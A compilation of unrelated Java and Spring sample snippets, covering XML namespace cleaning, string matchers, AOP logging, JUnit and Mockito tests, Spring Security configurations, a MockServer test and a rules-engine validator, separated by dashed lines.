		String xsltString = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:output method=\"xml\" indent=\"yes\" encoding=\"UTF-8\"/><xsl:template match=\"/\"><xsl:copy><xsl:apply-templates/></xsl:copy></xsl:template><xsl:template match=\"@*\"><xsl:attribute name=\"{local-name()}\"><xsl:value-of select=\"current()\"/></xsl:attribute></xsl:template><xsl:template match=\"*\"><xsl:element name=\"{local-name()}\"><xsl:apply-templates select=\"@* | * | text()\"/></xsl:element></xsl:template><xsl:template match=\"text()\"><xsl:copy><xsl:value-of select=\"current()\"/></xsl:copy></xsl:template></xsl:stylesheet>";
		try (ByteArrayOutputStream bo = new ByteArrayOutputStream()) {
			TransformerFactory factory = TransformerFactory.newInstance();
			Source xslt = new StreamSource(new ByteArrayInputStream(xsltString.getBytes()));
			Transformer transformer = factory.newTransformer(xslt);

			Source xmlSrc = new StreamSource(new ByteArrayInputStream(xmlStr.getBytes()));
			transformer.transform(xmlSrc, new StreamResult(bo));
			return bo.toString();
		} catch (TransformerException e) {
			System.err.println(e.getMessage());
		} catch (IOException e1) {
			System.err.println(e1.getMessage());
		}

		System.err.println("Unable to clean Namespace and Preamble from xml source, will use unmodified xml.");
		return xmlStr;
	}
}
-----------------------------------------------------------------------------------------
import java.lang.reflect.Method;
import java.util.regex.Pattern;

public abstract class StringMatcher {
	protected String stringToMatch;

	public StringMatcher(String stringToMatch) {
		this.stringToMatch = stringToMatch;
	}

	@Override
	public String toString() {
		return this.getClass().getSimpleName() + ":" + stringToMatch;
	}

	abstract public boolean match(String target);

	/**
	 * provision for define matcher in external data file, that can be converted
	 * to actual one in code!
	 * 
	 * @param type
	 * @param stringToMatch
	 * @return
	 */
	public static StringMatcher get(String type, String stringToMatch) {
		try {
			Method m = ClassUtil.getMethod(StringMatcher.class, type);
			return (StringMatcher) m.invoke(null, stringToMatch);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	public static StringMatcher exact(String stringToMatch) {
		return new Exact(stringToMatch);
	}

	public static StringMatcher exactIgnoringCase(String stringToMatch) {
		return new ExactIgnoringCase(stringToMatch);
	}

	public static StringMatcher startsWith(String stringToMatch) {
		return new StartsWith(stringToMatch);
	}

	public static StringMatcher startsWithIgnoringCase(String stringToMatch) {
		return new StartsWithIgnoringCase(stringToMatch);
	}

	public static StringMatcher endsWith(String stringToMatch) {
		return new EndsWith(stringToMatch);
	}

	public static StringMatcher endsWithIgnoringCase(String stringToMatch) {
		return new EndsWithIgnoringCase(stringToMatch);
	}

	public static StringMatcher contains(String stringToMatch) {
		return new Contains(stringToMatch);
	}

	public static StringMatcher containsIgnoringCase(String stringToMatch) {
		return new ContainsIgnoringCase(stringToMatch);
	}

	/**
	 * @param stringToMatch
	 *            : valid regular expression
	 * @return
	 */
	public static StringMatcher like(String stringToMatch) {
		return new Like(stringToMatch);
	}

	/**
	 * @param stringToMatch
	 *            : valid regular expression
	 * @return
	 */
	public static StringMatcher likeIgnoringCase(String stringToMatch) {
		return new LikeIgnoringCase(stringToMatch);
	}

	/**
	 * Numeric greater then
	 * 
	 * @param stringToMatch
	 * @return
	 */
	public static StringMatcher gt(String stringToMatch) {
		return new GT(stringToMatch);
	}

	/**
	 * Numeric greater then equal
	 * 
	 * @param stringToMatch
	 * @return
	 */
	public static StringMatcher gte(String stringToMatch) {
		return new GTE(stringToMatch);
	}

	/**
	 * Numeric less then
	 * 
	 * @param stringToMatch
	 * @return
	 */
	public static StringMatcher lt(String stringToMatch) {
		return new LT(stringToMatch);
	}

	/**
	 * Numeric less then equal
	 * 
	 * @param stringToMatch
	 * @return
	 */
	public static StringMatcher lte(String stringToMatch) {
		return new LTE(stringToMatch);
	}

	/**
	 * Numeric equal
	 * 
	 * @param stringToMatch
	 * @return
	 */
	public static StringMatcher eq(String stringToMatch) {
		return new EQ(stringToMatch);
	}

	private static class Exact extends StringMatcher {

		Exact(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			return stringToMatch.equals(target);
		}

	}

	private static class ExactIgnoringCase extends StringMatcher {
		ExactIgnoringCase(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			return stringToMatch.equalsIgnoreCase(target);
		}

	}

	private static class StartsWithIgnoringCase extends StringMatcher {
		StartsWithIgnoringCase(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			return target.toUpperCase().startsWith(stringToMatch.toUpperCase());
		}
	}

	private static class StartsWith extends StringMatcher {
		StartsWith(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			return target.startsWith(stringToMatch);
		}
	}

	private static class EndsWithIgnoringCase extends StringMatcher {
		EndsWithIgnoringCase(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			return target.toUpperCase().endsWith(stringToMatch.toUpperCase());
		}
	}

	private static class EndsWith extends StringMatcher {
		EndsWith(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			return target.endsWith(stringToMatch);
		}
	}

	private static class ContainsIgnoringCase extends StringMatcher {
		ContainsIgnoringCase(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			return target.toUpperCase().contains(stringToMatch.toUpperCase());
		}
	}

	private static class Contains extends StringMatcher {
		Contains(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			return target.contains(stringToMatch);
		}
	}

	private static class LikeIgnoringCase extends StringMatcher {
		LikeIgnoringCase(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			Pattern p = Pattern.compile(stringToMatch, Pattern.CASE_INSENSITIVE);
			return p.matcher(target).matches();
		}
	}

	private static class Like extends StringMatcher {
		Like(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			return Pattern.matches(stringToMatch, target);
		}
	}

	private static class EQ extends StringMatcher {
		EQ(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			try {
				double expected = Double.parseDouble(stringToMatch);
				double actual = Double.parseDouble(target);

				return actual == expected;
			} catch (Exception e) {
				return false;
			}
		}
	}

	private static class LT extends StringMatcher {
		LT(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			try {
				double expected = Double.parseDouble(stringToMatch);
				double actual = Double.parseDouble(target);

				return actual < expected;
			} catch (Exception e) {
				return false;
			}
		}
	}

	private static class LTE extends StringMatcher {
		LTE(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			try {
				double expected = Double.parseDouble(stringToMatch);
				double actual = Double.parseDouble(target);

				return actual <= expected;
			} catch (Exception e) {
				return false;
			}
		}
	}

	private static class GT extends StringMatcher {
		GT(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			try {
				double expected = Double.parseDouble(stringToMatch);
				double actual = Double.parseDouble(target);

				return actual > expected;
			} catch (Exception e) {
				return false;
			}
		}
	}

	private static class GTE extends StringMatcher {
		GTE(String stringToMatch) {
			super(stringToMatch);
		}

		@Override
		public boolean match(String target) {
			try {
				double expected = Double.parseDouble(stringToMatch);
				double actual = Double.parseDouble(target);

				return actual >= expected;
			} catch (Exception e) {
				return false;
			}
		}
	}

}
-----------------------------------------------------------------------------------------
import java.io.InputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.BufferedInputStream;
import java.net.URLConnection;
import java.net.URL;

/**
 * Created by IntelliJ IDEA.
 * User: pdoubleya
 * Date: May 15, 2009
 * Time: 11:56:03 AM
 * To change this template use File | Settings | File Templates.
 */
public class StreamResource {
    private final String _uri;
    private URLConnection _conn;
    private int _slen;
    private InputStream _inputStream;

    public StreamResource(final String uri) {
        _uri = uri;
    }

    public void connect() {
        try {
            _conn = new URL(_uri).openConnection();

            // If using Java 5+ you can set timeouts for the URL connection--useful if the remote
            // server is down etc.; the default timeout is pretty long
            //
            //uc.setConnectTimeout(10 * 1000);
            //uc.setReadTimeout(30 * 1000);
            //
            // TODO:CLEAN-JDK1.4
            // Since we target 1.4, we use a couple of system properties--note these are only supported
            // in the Sun JDK implementation--see the Net properties guide in the JDK
            // e.g. file:///usr/java/j2sdk1.4.2_17/docs/guide/net/properties.html
            System.setProperty("sun.net.client.defaultConnectTimeout", String.valueOf(10 * 1000));
            System.setProperty("sun.net.client.defaultReadTimeout", String.valueOf(30 * 1000));

            _conn.connect();
            _slen = _conn.getContentLength();
        } catch (java.net.MalformedURLException e) {
            XRLog.exception("bad URL given: " + _uri, e);
        } catch (FileNotFoundException e) {
            XRLog.exception("item at URI " + _uri + " not found");
        } catch (IOException e) {
            XRLog.exception("IO problem for " + _uri, e);
        }
    }

    public boolean hasStreamLength() {
        return _slen >= 0;
    }

    public int streamLength() {
        return _slen;
    }

    public BufferedInputStream bufferedStream() throws IOException {
        _inputStream = _conn.getInputStream();
        return new BufferedInputStream(_inputStream);
    }

    public void close() {
        if (_inputStream != null) {
            try {
                _inputStream.close();
            } catch (IOException e) {
                // swallow
            }
        }
    }
}
-----------------------------------------------------------------------------------------
import java.util.Arrays;

import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.AfterReturning;
import org.aspectj.lang.annotation.AfterThrowing;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;
import org.aspectj.lang.annotation.Pointcut;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

@Aspect
@Component
public class ControllerLoggingAspect {
	Logger log = LoggerFactory.getLogger(ControllerLoggingAspect.class);
	private ObjectMapper mapper = new ObjectMapper();

	@Pointcut("within(@org.springframework.web.bind.annotation.RestController *)")
	public void restControllerPointCut() {
	}

	@Pointcut("execution(public * *(..))")
	public void endPoints() {
	}

	@Pointcut("endPoints() && restControllerPointCut()")
	public void restEndPoints() {
	}

	@Before("restEndPoints()")
	public void logBefore(JoinPoint joinPoint) {
		log.info("Entering Method: " + joinPoint.getSignature().getName());
		log.debug("Arguments: " + Arrays.toString(joinPoint.getArgs()));
	}

	@AfterReturning(pointcut = "restEndPoints()", returning = "result")
	public void logAfterReturn(JoinPoint joinPoint, Object result) {
		log.info("Exiting Method: " + joinPoint.getSignature().getName());
		if (log.isDebugEnabled()) {
			try {
				log.debug("Response: " + mapper.writeValueAsString(result));
			} catch (JsonProcessingException e) {
				log.warn("An error occurred while attempting to write value as JSON: " + result.toString());
				log.warn(e.getMessage(), e);
			}
		}
	}

	@AfterThrowing(pointcut = "restEndPoints()", throwing = "t")
	public void logAfterException(JoinPoint joinPoint, Throwable t) {
		log.debug("Exception occurred in method: " + joinPoint.getSignature().getName());
		log.debug("Exception: " + t.getMessage(), t);
	}
}
-----------------------------------------------------------------------------------------
	@ParameterizedTest
	@CsvFileSource(resources="/DatesSource.csv")
	public void verifyDateValidationUsingCsvFile(@ToDataValidationBean DateValidationBean dateValidation) {
		ReservationServiceImpl service = new ReservationServiceImpl();
		List<String> errorMsgs = service.verifyReservationDates(dateValidation.checkInDate,
				dateValidation.checkOutDate);
		assertThat(errorMsgs).containsExactlyInAnyOrder(dateValidation.errorMsgs);
	}
-----------------------------------------------------------------------------------------
@SpringJUnitWebConfig(HotelApplication.class)
@WebMvcTest(controllers = CustomerController.class, secure = false)

mvn clean package -P test-functional

mvn test -Dgroups=smoke
mvn surefire:test -Dgroups=smoke
-----------------------------------------------------------------------------------------
git clone https://github.com/OpenLiberty/sample-getting-started.git

cd sample-getting-started

mvn clean package liberty:run-server

./gradlew build --no-daemon --continue
-----------------------------------------------------------------------------------------
@SpringBootTest
@TestInstance(Lifecycle.PER_CLASS)
@Execution(ExecutionMode.CONCURRENT)
-----------------------------------------------------------------------------------------
org.springframework.boot.autoconfigure.EnableAutoConfiguration=\
io.spring.initializr.actuate.autoconfigure.InitializrActuatorEndpointsAutoConfiguration,\
io.spring.initializr.actuate.autoconfigure.InitializrStatsAutoConfiguration
-----------------------------------------------------------------------------------------
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.mockito.Mockito.when;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

@ExtendWith(MockitoExtension.class)
public class TestMockitoInjection {
	private BoringService service;

	public TestMockitoInjection(@Mock BoringService service) {
		this.service = service;
	}

	@Test
	public void testConstructorInjectedValue() {
		when(service.returnNumber()).thenReturn(2);
		assertEquals(2, service.returnNumber());
	}

	@Test
	public void testMethodInjection(@Mock BoringService service) {
		when(service.returnNumber()).thenReturn(3);
		assertEquals(3, service.returnNumber());
	}

	public class BoringService {
		public int returnNumber() {
			return 1;
		}
	}
}

import static org.junit.platform.engine.discovery.DiscoverySelectors.selectClass;

import org.junit.jupiter.api.Test;
import org.junit.platform.testkit.engine.EngineTestKit;
import org.junit.platform.testkit.engine.Events;

public class TestKitExample {

    @Test
    void failIfTestsAreSkipped() {
        Events testEvents = EngineTestKit 
            .engine("junit-jupiter") 
            .selectors(selectClass(TestKitSubject.class)) 
            .execute() 
            .tests(); 

        testEvents.assertStatistics(stats -> stats.skipped(1)); 
    }

}

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInfo;
import org.junit.jupiter.api.parallel.ResourceAccessMode;
import org.junit.jupiter.api.parallel.ResourceLock;

public class SharedResourceParallelTest {

	@Test
	@ResourceLock(value = "UNIQUE_RESOURCE", mode = ResourceAccessMode.READ_WRITE)
	public void readWriteTestA(TestInfo info) throws InterruptedException {
		System.out.println("Executing " + info.getDisplayName() + " on thread: " + Thread.currentThread());
		Thread.sleep(2000L);
	}

	@Test
	@ResourceLock(value = "UNIQUE_RESOURCE", mode = ResourceAccessMode.READ_WRITE)
	public void readWriteTestB(TestInfo info) throws InterruptedException {
		System.out.println("Executing " + info.getDisplayName() + " on thread: " + Thread.currentThread());
		Thread.sleep(2000L);
	}
	
	@Test
	@ResourceLock(value = "UNIQUE_RESOURCE", mode = ResourceAccessMode.READ)
	public void readOnlyTestA(TestInfo info) throws InterruptedException {
		System.out.println("Executing " + info.getDisplayName() + " on thread: " + Thread.currentThread());
		Thread.sleep(2000L);
	}

	@Test
	@ResourceLock(value = "UNIQUE_RESOURCE", mode = ResourceAccessMode.READ)
	public void readOnlyTestB(TestInfo info) throws InterruptedException {
		System.out.println("Executing " + info.getDisplayName() + " on thread: " + Thread.currentThread());
		Thread.sleep(2000L);
	}
}
-----------------------------------------------------------------------------------------
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.batch.item.ItemProcessor;

public class MahomiesProcessor implements ItemProcessor<FootballPlayRecord, FootballPlayRecord> {
	private static final Logger LOGGER = LoggerFactory.getLogger(MahomiesProcessor.class);

	@Override
	public FootballPlayRecord process(FootballPlayRecord item) throws Exception {
		if (item.getDescription().contains("MAHOMES")) {
			if (item.getDescription().contains("TOUCHDOWN")) {
				if (item.isBigPlay()) {
					item.setMahomesFlair("An incredible play by Mahomes: 😍😍😍");
				} else {
					item.setMahomesFlair("A great play Mahomes: 🙌🙌🙌");
				}
			} else if (item.getDescription().contains("INTERCEPTION") || item.getDescription().contains("FUMBLE")) {
				item.setMahomesFlair("Oh no an interception: 😭😭😭");
			} else if (item.isBigPlay()) {
				item.setMahomesFlair("A big play by Mahomes: 🤩🤩🤩");
			} else {
				item.setMahomesFlair("Just normal Mahomes magic: 😄😄😄");
			}
			LOGGER.info(item.getMahomesFlair());
		}
		return item;
	}

}
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.batch.item.ItemProcessor;

import com.fasterxml.jackson.databind.ObjectMapper;

public class JSONProcessor implements ItemProcessor<FootballPlayRecord, FootballPlayRecord> {
	private static final Logger LOGGER = LoggerFactory.getLogger(JSONProcessor.class);
	ObjectMapper mapper = new ObjectMapper();

	@Override
	public FootballPlayRecord process(FootballPlayRecord item) throws Exception {
		String jsonString = mapper.writeValueAsString(item);

		LOGGER.info(jsonString);
		return item;
	}

}
-----------------------------------------------------------------------------------------
@Modifying(clearAutomatically = true)
-----------------------------------------------------------------------------------------
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Description;
import org.springframework.context.support.ResourceBundleMessageSource;
import org.thymeleaf.spring4.SpringTemplateEngine;
import org.thymeleaf.spring4.view.ThymeleafViewResolver;
import org.thymeleaf.templateresolver.ServletContextTemplateResolver;

@SpringBootApplication
public class CommoditiesClientApplication {

	public static void main(String[] args) {
		SpringApplication.run(CommoditiesClientApplication.class, args);
	}

	@Bean
	@Description("Thymeleaf Template Resolver")
	public ServletContextTemplateResolver templateResolver() {
		ServletContextTemplateResolver templateResolver = new ServletContextTemplateResolver();
		templateResolver.setPrefix("/WEB-INF/views/");
		templateResolver.setSuffix(".html");
		templateResolver.setTemplateMode("HTML5");

		return templateResolver;
	}

	@Bean
	@Description("Thymeleaf Template Engine")
	public SpringTemplateEngine templateEngine() {
		SpringTemplateEngine templateEngine = new SpringTemplateEngine();
		templateEngine.setTemplateResolver(templateResolver());
		templateEngine.setTemplateEngineMessageSource(messageSource());
		return templateEngine;
	}

	@Bean
	@Description("Thymeleaf View Resolver")
	public ThymeleafViewResolver viewResolver() {
		ThymeleafViewResolver viewResolver = new ThymeleafViewResolver();
		viewResolver.setTemplateEngine(templateEngine());
		viewResolver.setOrder(1);
		return viewResolver;
	}

	@Bean
	@Description("Spring Message Resolver")
	public ResourceBundleMessageSource messageSource() {
		ResourceBundleMessageSource messageSource = new ResourceBundleMessageSource();
		messageSource.setBasename("messages");
		return messageSource;
	}
}
-----------------------------------------------------------------------------------------
@EnableStubRunnerServer
@Timed(value = "people.asset", longTask = true)
-----------------------------------------------------------------------------------------
   @Bean
    public SecurityEvaluationContextExtension securityEvaluationContextExtension() {
        return new SecurityEvaluationContextExtension();
    }
-----------------------------------------------------------------------------------------
    @Bean
    public DaoAuthenticationProvider authProvider() {
        final CustomAuthenticationProvider authProvider 
        	= new CustomAuthenticationProvider(userRepository, userDetailsService);
        authProvider.setPasswordEncoder(encoder());
        return authProvider;
    }

    @Bean
    public PasswordEncoder encoder() {
        return new BCryptPasswordEncoder(11);
    }
-----------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;

@Configuration
public class SecurityConfiguration extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity httpSecurity) throws Exception {
        httpSecurity.authorizeRequests()
            .antMatchers("/h2-console/**")
            .permitAll()
            .anyRequest()
            .authenticated()
            .and()
            .formLogin()
            .permitAll();
        httpSecurity.csrf()
            .ignoringAntMatchers("/h2-console/**");
        httpSecurity.headers()
            .frameOptions()
            .sameOrigin();
    }

    @Autowired
    private DataSource dataSource;

    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
        auth.jdbcAuthentication()
            .dataSource(dataSource)
            .withDefaultSchema()
            .withUser(User.withUsername("user")
                .password(passwordEncoder().encode("pass"))
                .roles("USER"));
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}


    @Override
    protected void configure(final HttpSecurity http) throws Exception {
        // @formatter:off
        http.authorizeRequests()
            .antMatchers("/login").permitAll()
//            .antMatchers("/foos/**").hasIpAddress("11.11.11.11")
            .antMatchers("/foos/**").access("isAuthenticated() and hasIpAddress('11.11.11.11')")
            .anyRequest().authenticated()
            .and().formLogin().permitAll()
            .and().csrf().disable();
        // @formatter:on
    }
-----------------------------------------------------------------------------------------
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClientBuilder;
import org.junit.*;
import org.mockserver.client.server.MockServerClient;
import org.mockserver.integration.ClientAndProxy;
import org.mockserver.integration.ClientAndServer;
import org.mockserver.model.Header;
import org.mockserver.model.HttpForward;
import org.mockserver.verify.VerificationTimes;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import static junit.framework.Assert.assertEquals;
import static org.mockserver.integration.ClientAndProxy.startClientAndProxy;
import static org.mockserver.integration.ClientAndServer.startClientAndServer;
import static org.mockserver.matchers.Times.exactly;
import static org.mockserver.model.HttpClassCallback.callback;
import static org.mockserver.model.HttpForward.forward;
import static org.mockserver.model.HttpRequest.request;
import static org.mockserver.model.HttpResponse.response;
import static org.mockserver.model.StringBody.exact;

public class MockServerLiveTest {

    private static ClientAndServer mockServer;

    @BeforeClass
    public static void startServer() {
        mockServer = startClientAndServer(1080);
    }


    @Test
    public void whenPostRequestMockServer_thenServerReceived(){
        createExpectationForInvalidAuth();
        hitTheServerWithPostRequest();
        verifyPostRequest();
    }

    @Test
    public void whenPostRequestForInvalidAuth_then401Received(){
        createExpectationForInvalidAuth();
        org.apache.http.HttpResponse response = hitTheServerWithPostRequest();
        assertEquals(401, response.getStatusLine().getStatusCode());
    }

    @Test
    public void whenGetRequest_ThenForward(){
        createExpectationForForward();
        hitTheServerWithGetRequest("index.html");
        verifyGetRequest();

    }

    @Test
    public void whenCallbackRequest_ThenCallbackMethodCalled(){
        createExpectationForCallBack();
        org.apache.http.HttpResponse response= hitTheServerWithGetRequest("/callback");
        assertEquals(200,response.getStatusLine().getStatusCode());
    }

    private void verifyPostRequest() {
        new MockServerClient("localhost", 1080).verify(
                request()
                        .withMethod("POST")
                        .withPath("/validate")
                        .withBody(exact("{username: 'foo', password: 'bar'}")),
                VerificationTimes.exactly(1)
        );
    }
    private void verifyGetRequest() {
        new MockServerClient("localhost", 1080).verify(
                request()
                        .withMethod("GET")
                        .withPath("/index.html"),
                VerificationTimes.exactly(1)
        );
    }

    private org.apache.http.HttpResponse hitTheServerWithPostRequest() {
        String url = "http://127.0.0.1:1080/validate";
        HttpClient client = HttpClientBuilder.create().build();
        HttpPost post = new HttpPost(url);
        post.setHeader("Content-type", "application/json");
        org.apache.http.HttpResponse response=null;

        try {
            StringEntity stringEntity = new StringEntity("{username: 'foo', password: 'bar'}");
            post.getRequestLine();
            post.setEntity(stringEntity);
            response=client.execute(post);

        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        return response;
    }

    private org.apache.http.HttpResponse hitTheServerWithGetRequest(String page) {
        String url = "http://127.0.0.1:1080/"+page;
        HttpClient client = HttpClientBuilder.create().build();
        org.apache.http.HttpResponse response=null;
        HttpGet get = new HttpGet(url);
        try {
            response=client.execute(get);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        return response;
    }

    private void createExpectationForInvalidAuth() {
        new MockServerClient("127.0.0.1", 1080)
                .when(
                    request()
                        .withMethod("POST")
                        .withPath("/validate")
                        .withHeader("\"Content-type\", \"application/json\"")
                        .withBody(exact("{username: 'foo', password: 'bar'}")),
                        exactly(1)
                )
                .respond(
                    response()
                        .withStatusCode(401)
                        .withHeaders(
                            new Header("Content-Type", "application/json; charset=utf-8"),
                            new Header("Cache-Control", "public, max-age=86400")
                    )
                        .withBody("{ message: 'incorrect username and password combination' }")
                        .withDelay(TimeUnit.SECONDS,1)
                );
    }

    private void createExpectationForForward(){
        new MockServerClient("127.0.0.1", 1080)
            .when(
                request()
                   .withMethod("GET")
                   .withPath("/index.html"),
                   exactly(1)
                )
                .forward(
                    forward()
                        .withHost("www.mock-server.com")
                        .withPort(80)
                        .withScheme(HttpForward.Scheme.HTTP)
                );
    }

    private void createExpectationForCallBack(){
        mockServer
            .when(
                request()
                    .withPath("/callback")
                )
                .callback(
                    callback()
                        .withCallbackClass("com.baeldung.mock.server.ExpectationCallbackHandler")
                );
    }

    @AfterClass
    public static void stopServer() {
        mockServer.stop();
    }
}
-----------------------------------------------------------------------------------------
import static java.lang.String.format;

import java.lang.annotation.Annotation;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.ArrayList;
import java.util.List;
import org.jeasy.rules.annotation.Action;
import org.jeasy.rules.annotation.Condition;
import org.jeasy.rules.annotation.Fact;
import org.jeasy.rules.annotation.Priority;
import org.jeasy.rules.annotation.Rule;
import org.jeasy.rules.api.Facts;

/**
 * This component validates that an annotated rule object is well defined.
 *
 * @author Mahmoud Ben Hassine (mahmoud.benhassine@icloud.com)
 */
class RuleDefinitionValidator {

    void validateRuleDefinition(final Object rule) {
        checkRuleClass(rule);
        checkConditionMethod(rule);
        checkActionMethods(rule);
        checkPriorityMethod(rule);
    }

    private void checkRuleClass(final Object rule) {
        if (!isRuleClassWellDefined(rule)) {
            throw new IllegalArgumentException(format("Rule '%s' is not annotated with '%s'", rule.getClass().getName(), Rule.class.getName()));
        }
    }

    private void checkConditionMethod(final Object rule) {
        List<Method> conditionMethods = getMethodsAnnotatedWith(Condition.class, rule);
        if (conditionMethods.isEmpty()) {
            throw new IllegalArgumentException(format("Rule '%s' must have a public method annotated with '%s'", rule.getClass().getName(), Condition.class.getName()));
        }

        if (conditionMethods.size() > 1) {
            throw new IllegalArgumentException(format("Rule '%s' must have exactly one method annotated with '%s'", rule.getClass().getName(), Condition.class.getName()));
        }

        Method conditionMethod = conditionMethods.get(0);

        if (!isConditionMethodWellDefined(conditionMethod)) {
            throw new IllegalArgumentException(format("Condition method '%s' defined in rule '%s' must be public, must return boolean type and may have parameters annotated with @Fact (and/or exactly one parameter of type Facts or one of its sub-types).", conditionMethod, rule.getClass().getName()));
        }
    }

    private void checkActionMethods(final Object rule) {
        List<Method> actionMethods = getMethodsAnnotatedWith(Action.class, rule);
        if (actionMethods.isEmpty()) {
            throw new IllegalArgumentException(format("Rule '%s' must have at least one public method annotated with '%s'", rule.getClass().getName(), Action.class.getName()));
        }

        for (Method actionMethod : actionMethods) {
            if (!isActionMethodWellDefined(actionMethod)) {
                throw new IllegalArgumentException(format("Action method '%s' defined in rule '%s' must be public, must return void type and may have parameters annotated with @Fact (and/or exactly one parameter of type Facts or one of its sub-types).", actionMethod, rule.getClass().getName()));
            }
        }
    }

    private void checkPriorityMethod(final Object rule) {

        List<Method> priorityMethods = getMethodsAnnotatedWith(Priority.class, rule);

        if (priorityMethods.isEmpty()) {
            return;
        }

        if (priorityMethods.size() > 1) {
            throw new IllegalArgumentException(format("Rule '%s' must have exactly one method annotated with '%s'", rule.getClass().getName(), Priority.class.getName()));
        }

        Method priorityMethod = priorityMethods.get(0);

        if (!isPriorityMethodWellDefined(priorityMethod)) {
            throw new IllegalArgumentException(format("Priority method '%s' defined in rule '%s' must be public, have no parameters and return integer type.", priorityMethod, rule.getClass().getName()));
        }
    }

    private boolean isRuleClassWellDefined(final Object rule) {
        return Utils.isAnnotationPresent(Rule.class, rule.getClass());
    }

    private boolean isConditionMethodWellDefined(final Method method) {
        return Modifier.isPublic(method.getModifiers())
                && method.getReturnType().equals(Boolean.TYPE)
                && validParameters(method);
    }

    private boolean validParameters(final Method method) {
        int notAnnotatedParameterCount = 0;
        Annotation[][] parameterAnnotations = method.getParameterAnnotations();
        for(Annotation[] annotations : parameterAnnotations){
            if(annotations.length == 0){
                notAnnotatedParameterCount += 1;
            } else {
                //Annotation types has to be Fact
                for(Annotation annotation : annotations){
                    if(!annotation.annotationType().equals(Fact.class)){
                        return false;
                    }
                }
            }
        }
        if(notAnnotatedParameterCount > 1){
            return false;
        }
        if (notAnnotatedParameterCount == 1) {
            Class<?>[] parameterTypes = method.getParameterTypes();
            int index = getIndexOfParameterOfTypeFacts(method); // TODO use method.getParameters when moving to Java 8
            return Facts.class.isAssignableFrom(parameterTypes[index]);
        }
        return true;
    }

    private int getIndexOfParameterOfTypeFacts(Method method) {
        Class<?>[] parameterTypes = method.getParameterTypes();
        int index = 0;
        for (Class<?> parameterType : parameterTypes) {
            if (Facts.class.isAssignableFrom(parameterType)) {
                return index;
            }
            index++;
        }
        return 0;
    }

    private boolean isActionMethodWellDefined(final Method method) {
        return Modifier.isPublic(method.getModifiers())
                && method.getReturnType().equals(Void.TYPE)
                && validParameters(method);
    }

    private boolean isPriorityMethodWellDefined(final Method method) {
        return Modifier.isPublic(method.getModifiers())
                && method.getReturnType().equals(Integer.TYPE)
                && method.getParameterTypes().length == 0;
    }

    private List<Method> getMethodsAnnotatedWith(final Class<? extends Annotation> annotation, final Object rule) {
        Method[] methods = getMethods(rule);
        List<Method> annotatedMethods = new ArrayList<>();
        for (Method method : methods) {
            if (method.isAnnotationPresent(annotation)) {
                annotatedMethods.add(method);
            }
        }
        return annotatedMethods;
    }

    private Method[] getMethods(final Object rule) {
        return rule.getClass().getMethods();
    }

}
-----------------------------------------------------------------------------------------
import org.assertj.core.api.AbstractAssert;

public class PersonAssert extends AbstractAssert<PersonAssert, Person> {

    public PersonAssert(Person actual) {
        super(actual, PersonAssert.class);
    }

    public static PersonAssert assertThat(Person actual) {
        return new PersonAssert(actual);
    }

    public PersonAssert hasFullName(String fullName) {
        isNotNull();
        if (!actual.getFullName().equals(fullName)) {
            failWithMessage("Expected person to have full name %s but was %s", fullName, actual.getFullName());
        }
        return this;
    }

    public PersonAssert isAdult() {
        isNotNull();
        if (actual.getAge() < 18) {
            failWithMessage("Expected person to be adult");
        }
        return this;
    }

